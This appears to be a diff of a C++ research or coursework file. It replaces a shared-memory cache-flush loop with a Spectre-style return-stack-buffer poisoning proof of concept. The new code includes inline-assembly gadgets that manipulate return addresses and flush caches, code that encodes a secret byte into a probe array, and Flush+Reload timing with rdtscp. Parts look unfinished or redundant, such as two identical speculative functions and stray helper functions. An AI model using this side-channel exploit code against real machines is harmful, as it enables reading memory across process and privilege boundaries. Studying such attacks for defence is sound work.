@@ -1,58 +1,102 @@
-#include <iostream> 
-#include <sys/ipc.h> 
-#include <sys/shm.h> 
-#include <stdio.h> 
 #include "util.hpp"
 
-using namespace std; 
-  
-int main() 
-{ 
-   // ftok to generate unique key 
-    // key_t key = ftok("shmfile",65); 
-  
-    // // shmget returns an identifier in shmid 
-    // int shmid = shmget(key,1024,0666|IPC_CREAT); 
+using namespace std;
 
-    // // shmat to attach to shared memory 
-    // char* addr = (char*) shmat(shmid,(void*)0,0); 
-      
-    // unsigned int index = 10, repeat = 1000, dummy;
-    // char temp;
-    // for(int i=0;;i++){
-    // 	temp&=addr[i];
-    // 	printf("%d\n",i);
-    // }
+char array[256*256];
+char temp;
+char secret = 'p';
 
-    // shmdt(addr); 
-    
-    // // destroy the shared memory 
-    // shmctl(shmid,IPC_RMID,NULL); 
+void gadget_flush(){
+    __asm__(
+    "pop %rdi;"
+    "pop %rdi;" 
+    "pop %rdi;"
+    "nop;"
+    "pop %rbp;"
+    "clflush (%rsp);"
+    "clflush (%rip);"
+    "cpuid;"
+    "retq;");
+}
 
-    const int SIZE = 1<<20; 
-  
-    /* name of the shared memory object */
-    const char* name = "OS"; 
-    char temp;
-  
-    /* shared memory file descriptor */
-    int shm_fd; 
-  
-    /* pointer to shared memory obect */
-    char* ptr; 
-  
-    /* create the shared memory object */
-    shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666); 
-  
-    /* configure the size of the shared memory object */
-    ftruncate(shm_fd, SIZE); 
-  
-    /* memory map the shared memory object */
-    ptr = (char*)mmap(0, SIZE, PROT_WRITE, MAP_SHARED, shm_fd, 0); 
+void gadget_nonflush(){
+    __asm__(
+    "pop %rdi;"
+    "pop %rdi;" 
+    "pop %rdi;"
+    "nop;"
+    "pop %rbp;"
+    "clflush (%rsp);"
+    "cpuid;"
+    "retq;");
+}
 
-    while(1) {
-        clflush((void *)(&ptr[0]));
+
+void speculative(char *secret_ptr){
+    gadget_nonflush();
+    secret = *secret_ptr;
+    temp &= array[secret * 256];
+}
+
+void speculative_nonflush(char *secret_ptr){
+    gadget_nonflush();
+    secret = *secret_ptr;
+    temp &= array[secret * 256];
+}
+
+void speculative_flush(char *secret_ptr){
+    gadget_flush();
+    secret = *secret_ptr;
+    temp &= array[secret * 256];
+}
+
+int addFive(int x){
+    return x+5;
+}
+
+inline void time(int i) {
+    unsigned int dummy;
+    auto t1 = __rdtscp(&dummy);
+    auto junk = array[i*256];
+    auto t2 = __rdtscp(&dummy);
+    cout<< "Access time of: "<< i <<": "<<t2-t1<<endl;
+}
+
+volatile void soo(){
+    int i=5;
+    return;
+}
+
+int main(){
+    soo();
+    int x = 2;
+    int y = addFive(x);
+
+    for (int i = 0; i < 256; i++){
+        clflush(&array[i*256]);
     }
-     
+
+    unsigned int dummy;
+
+    auto t1 = __rdtscp(&dummy);
+    speculative_nonflush(&secret);
+    auto t2 = __rdtscp(&dummy);
+    //cout<<t2-t1<<endl;
+
+
+    auto t3 = __rdtscp(&dummy);
+    speculative_flush(&secret);
+    auto t4 = __rdtscp(&dummy);
+    //cout<<t4-t3<<endl;
+
+    speculative(&secret);
+    printf("RSB polluting on secret: %d\n", secret);
+    time(5);
+    time(63);
+    time(102);
+    time(112);
+    time(145);
+    time(204);
+    time(243);
     return 0;
-} 
+}
